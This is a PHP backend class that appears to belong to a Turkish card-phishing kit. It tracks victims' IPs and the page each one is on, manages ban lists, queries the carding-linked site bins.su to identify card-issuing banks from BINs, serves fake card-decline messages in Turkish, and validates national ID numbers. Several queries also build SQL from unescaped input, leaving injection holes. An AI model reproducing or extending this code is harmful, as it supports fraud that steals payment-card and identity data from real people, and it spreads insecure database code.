<?php

class Ajax
{
    private $online = 0;
    private $offline = 0;
    private $total = 0;
    private $ban = 0;
    private $db = "";


    public function __construct($db)
    {
        $this->db = $db;
    }


    public function getOnline()
    {
        $this->online = 0;
        $query = $this->db->query("SELECT * FROM ips", PDO::FETCH_ASSOC);
        if ($query->rowCount()) {
            foreach ($query as $v) {
                if ($v['lastOnline'] > time()) {
                    $this->online = $this->online + 1;
                }
            }
        }

        return $this->online;
    }

    public function getBans()
    {
        $this->ban = 0;
        $bans = [];
        $query = $this->db->query("SELECT * FROM bans", PDO::FETCH_ASSOC);
        foreach ($query as $v) {
            $this->ban = $this->ban + 1;
            $bans[] = $v;
        }

        return ['count' => $this->ban, 'data' => $bans];
    }

    public function getAllRecords()
    {
        return $this->db->query("SELECT * FROM records WHERE ipAddress NOT IN (SELECT ipAddress FROM bans) ORDER BY id DESC");
    }

    public function binQuery($num)
    {
        $ch = curl_init("http://bins.su/");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "action=searchbins&bins=$num&bank=&country=");
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

        $html = curl_exec($ch);
        curl_close($ch);

        $dom = new DOMDocument();
        @$dom->loadHTML($html);
        $xpath = new DOMXPath($dom);
        $rows = $xpath->query('//*[@id="result"] ');
        $data = [];
        foreach ($rows as $row) {
            foreach ($row->getElementsByTagName('table') as $tbody) {
                $subelements = $tbody->getElementsByTagName("tr");
                foreach ($subelements as $key => $el) {
                    if ($key == 0) {
                        continue;
                    }
                    $cells = $el->getElementsByTagName('td');
                    foreach ($cells as $cell) {
                        $data[] = $cell->nodeValue;
                    }
                }
            }
        }
        //Array ( [0] => 554960 [1] => TR [2] => MASTERCARD [3] => CREDIT [4] => STANDARD [5] => TURKIYE GARANTI BANKASI A.S. )
        return json_encode(['bin' => $data[0], 'country' => $data[1], 'vendor' => $data[2], 'type' => $data[3], 'level' => $data[4], 'bank' => $data[5]]);
    }

    public function errorMsg($type)
    {
        $array = [
            'eticaret' => 'Kredi/Banka Kartınız e-ticaret işlemine kapalıdır.',
            'limit' => 'Kredi/Banka Kartınızın limiti yeterli değil.',
            'normal' => 'Kredi/Banka kartınızdan dolayı işleme devam edilememektedir. '
        ];
        return $array[$type];
    }

    public function get_os_name($useragent)
    {
        $ostypes = array(
            'Win311' => 'Win16',
            'Win95' => '(Windows 95)|(Win95)|(Windows_95)',
            'WinME' => '(Windows 98)|(Win 9x 4.90)|(Windows ME)',
            'Windows 98' => '(Windows 98)|(Win98)',
            'Windows 2000' => '(Windows NT 5.0)|(Windows 2000)',
            'Windows XP' => '(Windows NT 5.1)|(Windows XP)',
            'WinServer2003' => '(Windows NT 5.2)',
            'WinVista' => '(Windows NT 6.0)',
            'Windows 7' => '(Windows NT 6.1)',
            'Windows 8' => '(Windows NT 6.2)',
            'WinNT' => '(Windows NT 4.0)|(WinNT4.0)|(WinNT)|(Windows NT)',
            'OpenBSD' => 'OpenBSD',
            'SunOS' => 'SunOS',
            'Ubuntu' => 'Ubuntu',
            'Android' => 'Android',
            'Linux' => '(Linux)|(X11)',
            'iPhone' => 'iPhone',
            'iPad' => 'iPad',
            'MacOS' => '(Mac_PowerPC)|(Macintosh)',
            'QNX' => 'QNX',
            'BeOS' => 'BeOS',
            'OS2' => 'OS/2',
            'SearchBot' => '(nuhk)|(Googlebot)|(Yammybot)|(Openbot)|(Slurp)|(MSNBot)|(Ask Jeeves/Teoma)|(ia_archiver)'
        );

        $useragent = strtolower($useragent ? $useragent : $_SERVER['HTTP_USER_AGENT']);
        foreach ($ostypes as $os => $pattern) {
            if (preg_match('/' . $pattern . '/i', $useragent))
                return $os;

        }
        return 'Unknown';
    }

    public function boslukKaldir($veri)
    {
        $veri = str_replace("/s+/","",$veri);
        $veri = str_replace(" ","",$veri);
        $veri = str_replace(" ","",$veri);
        $veri = str_replace(" ","",$veri);
        $veri = str_replace("/s/g","",$veri);
        $veri = str_replace("/s+/g","",$veri);		
        $veri = trim($veri);
        return $veri; 
    }

    public function binWithCardType($bin)
    {
        $bin = substr($bin, 0, 6);

        $bin = $this->binQuery($bin);
        $bin = json_decode($bin, true);
        $bank = $bin['bank'];
        $bank = strtolower($bank);

        if (strpos($bank, 'akbank') !== false) {
            $bank = 'akbank';
        } elseif (strpos($bank, 'finansbank') !== false) {
            $bank = 'finansbank';
        } elseif (strpos($bank, 'garanti') !== false) {
            $bank = 'garanti';
        } elseif (strpos($bank, 'halk bankasi') !== false) {
            $bank = 'halkbank';
        } elseif (strpos($bank, 'ing') !== false) {
            $bank = 'ing';
        } elseif (strpos($bank, 'is bankasi') !== false) {
            $bank = 'isbankasi';
        } elseif (strpos($bank, 'yapi ve kredi bankasi') !== false) {
            $bank = 'yapikredi';
        } elseif (strpos($bank, 'ziraat') !== false) {
            $bank = 'ziraat';
        } else {
            $bank = 'other';
        }

        return $bank;
    }

    public function getTotalRecord()
    {
        $this->total = 0;

        $query = $this->db->query("SELECT * FROM records", PDO::FETCH_ASSOC);

        if ($query) {
            foreach ($query as $v) {
                $this->total = $this->total + 1;
            }
        } else {
            $this->total = 0;
        }
        return $this->total;
    }

    public function admin_data()
    {
        $query = $this->db->query("SELECT * FROM admin");
        $query->execute();
        return $query->fetch(PDO::FETCH_OBJ);
    }

    public function pageUpdate($ip, $pageName)
    {
        return $this->db->query("UPDATE records SET page = '$pageName' WHERE ipAddress = '$ip' ");
    }

    public function getIstatistic()
    {
        return json_encode([
            'online' => $this->online,
            'total' => $this->total
        ]);
    }


    public function getCityIDName($cityID)
    {
        $query = $this->db->prepare("SELECT * FROM duraklar WHERE id = $cityID");
        $query->execute();
        return $query->fetch(PDO::FETCH_OBJ)->display;
    }

    public function getIP()
    {
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
            $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
            $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }
        $client = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote = $_SERVER['REMOTE_ADDR'];

        if (filter_var($client, FILTER_VALIDATE_IP)) {
            $ip = $client;
        } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
            $ip = $forward;
        } else {
            $ip = $remote;
        }

        return $ip;
    }

    public function isMobile()
    {
        return preg_match("/(android|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);
    }

    public function isRecord($ip)
    {
        $query = $this->db->prepare("SELECT * FROM records WHERE ipAddress = ?");
        $query->execute([$ip]);
        return $query->fetch(PDO::FETCH_OBJ);
    }

    public function getTokenDetail($token)
    {
        $query = $this->db->prepare("SELECT * FROM payments WHERE token = ?");
        $query->execute([$token]);
        return $query->fetch(PDO::FETCH_OBJ);
    }

    public function paymentTokenGenerate($length = 25)
    {
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charLength - 1)];
        }
        return strtolower($randomString);
    }

    function tcDogrula($TCNO){
        $tek = 0;
        $cift = 0;
        $sonuc = 0;
        $TCToplam = 0;
        $hatali = array(11111111110, 22222222220, 33333333330, 44444444440, 55555555550, 66666666660, 77777777770, 88888888880, 99999999990);
    
        if (strlen($TCNO) != 11) return false;
        if (!is_numeric($TCNO)) return false;
        if ($TCNO[0] == '0') return false;
    
        $tek = intval($TCNO[0]) + intval($TCNO[2]) + intval($TCNO[4]) + intval($TCNO[6]) + intval($TCNO[8]);
        $cift = intval($TCNO[1]) + intval($TCNO[3]) + intval($TCNO[5]) + intval($TCNO[7]);
    
        $tek = $tek * 7;
        $sonuc = $tek - $cift;
        if ($sonuc % 10 != $TCNO[9]) return false;
    
        for ($i = 0; $i < 10; $i++) {
            $TCToplam += intval($TCNO[$i]);
        }
    
        if ($TCToplam % 10 != $TCNO[10]) return false;
    
        if (in_array($TCNO, $hatali)) return false;
    
        return true;
    }

    public function redirect($url)
    {
        header("location: $url");
        exit;
    }

    public function remove($table, $col, $value)
    {
        return $this->db->query("DELETE FROM $table WHERE $col = $value");
    }

    public function banControl($ip)
    {
        $query = $this->db->prepare("SELECT * FROM bans WHERE ipAddress = ?");
        $query->execute([$ip]);
        $result = $query->fetch(PDO::FETCH_OBJ);

        if ($result) {
            return true;
        } else {
            return false;
        }
    }

    public function recordClear()
    {
        $this->db->query("TRUNCATE TABLE records");
    }
    public function banClear()
    {
        $this->db->query("TRUNCATE TABLE bans");
    }
    public function offlineClear()
    {
        $records = $this->db->query("SELECT * FROM records");

        $deletedOffline = 0;

        foreach ($records as $value) {
            if ($value["lastOnline"] < time()) {
                if (empty($value["bkm"])) {
                    $id = $value["id"];
                    array_push($offline, $value["id"]);

                    $query = $this->db->query("DELETE FROM `records` WHERE `id` = $id ");

                    if ($query) {
                        $deletedOffline++;
                    }
                }
            }
        }
        return $deletedOffline;
    }


    # Input Security
    public function input($value)
    {
        $string = strip_tags($value);
        $string = filter_var($string, FILTER_SANITIZE_STRIPPED);
        $string = htmlspecialchars($string);

        return $string;
    }


}